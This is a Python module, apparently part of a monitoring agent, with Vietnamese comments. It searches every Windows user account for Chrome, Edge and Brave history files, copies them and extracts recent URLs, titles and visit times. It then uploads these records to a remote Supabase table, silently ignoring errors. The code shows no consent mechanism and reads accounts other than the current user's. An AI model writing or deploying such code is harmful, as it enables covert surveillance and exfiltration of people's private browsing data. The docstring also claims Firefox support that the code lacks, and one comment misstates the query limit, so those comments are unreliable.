import os
import shutil
import sqlite3
from datetime import datetime, timezone, timedelta
from utils.config import DEVICE_NAME

def find_user_history_files():
    """Tự động quét tất cả thư mục User trong C:\\Users\\ để tìm Chrome, Edge, Brave History"""
    history_sources = []
    users_dir = r"C:\Users"
    
    user_folders = []
    try:
        if os.path.exists(users_dir) and os.path.isdir(users_dir):
            for folder in os.listdir(users_dir):
                full_p = os.path.join(users_dir, folder)
                if os.path.isdir(full_p) and folder.lower() not in ['public', 'default', 'default user', 'all users']:
                    user_folders.append(full_p)
    except Exception:
        pass
    
    current_prof = os.environ.get('USERPROFILE')
    if current_prof and current_prof not in user_folders:
        user_folders.append(current_prof)

    browser_subpaths = [
        ("Chrome", r"AppData\Local\Google\Chrome\User Data"),
        ("Edge", r"AppData\Local\Microsoft\Edge\User Data"),
        ("Brave", r"AppData\Local\BraveSoftware\Brave-Browser\User Data")
    ]

    for u_folder in user_folders:
        for b_name, b_sub in browser_subpaths:
            base_ud = os.path.join(u_folder, b_sub)
            if not os.path.exists(base_ud):
                continue
            
            profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4']
            for prof in profiles:
                hist_p = os.path.join(base_ud, prof, "History")
                if os.path.exists(hist_p):
                    history_sources.append({
                        "name": b_name,
                        "path": hist_p
                    })
    
    return history_sources

def get_browser_history(supabase):
    """
    Trích xuất lịch sử duyệt web từ các trình duyệt phổ biến (Chrome, Edge, Brave, Firefox)
    và đồng bộ lên Supabase browser_history_logs
    """
    history_sources = find_user_history_files()
    if not history_sources:
        return

    temp_dir = os.environ.get('TEMP', r"C:\Windows\Temp")

    # Lấy 30 URL gần nhất đã ghi trên Supabase để tránh chèn trùng lặp
    existing_urls = set()
    try:
        res = supabase.table("browser_history_logs").select("url").eq("device_name", DEVICE_NAME).order("visit_time", ascending=False).limit(50).execute()
        if res.data:
            existing_urls = {r["url"] for r in res.data if "url" in r}
    except Exception:
        pass

    for b in history_sources:
        history_db = b["path"]
        if not os.path.exists(history_db):
            continue

        temp_db = os.path.join(temp_dir, f"temp_{b['name']}_{os.getpid()}_history.db")
        try:
            shutil.copyfile(history_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            # Trích xuất 15 trang web mới ghé thăm gần nhất
            query = """
            SELECT urls.title, urls.url, urls.last_visit_time
            FROM urls
            WHERE urls.url NOT LIKE 'chrome://%' AND urls.url NOT LIKE 'edge://%' AND urls.url NOT LIKE 'about:%'
            ORDER BY urls.last_visit_time DESC
            LIMIT 15
            """
            cursor.execute(query)
            rows = cursor.fetchall()

            history_items = []
            for row in rows:
                title, url, last_visit_raw = row
                
                if not url or len(url) < 5 or url in existing_urls:
                    continue

                visit_iso = datetime.now(timezone.utc).isoformat()
                if last_visit_raw and last_visit_raw > 0:
                    try:
                        webkit_epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
                        visit_dt = webkit_epoch + timedelta(microseconds=last_visit_raw)
                        visit_iso = visit_dt.isoformat()
                    except Exception:
                        pass

                history_items.append({
                    "device_name": DEVICE_NAME,
                    "browser_name": b["name"],
                    "title": title or url,
                    "url": url,
                    "visit_time": visit_iso
                })
                existing_urls.add(url)

            conn.close()
            try:
                os.remove(temp_db)
            except Exception:
                pass

            if history_items:
                try:
                    supabase.table("browser_history_logs").insert(history_items).execute()
                    print(f"🌐 Đã ghi nhận {len(history_items)} lịch sử duyệt web mới ({b['name']})")
                except Exception as e:
                    for item in history_items:
                        try:
                            supabase.table("browser_history_logs").insert(item).execute()
                        except Exception:
                            pass

        except Exception as e:
            print(f"Lỗi đọc history {b['name']}: {e}")
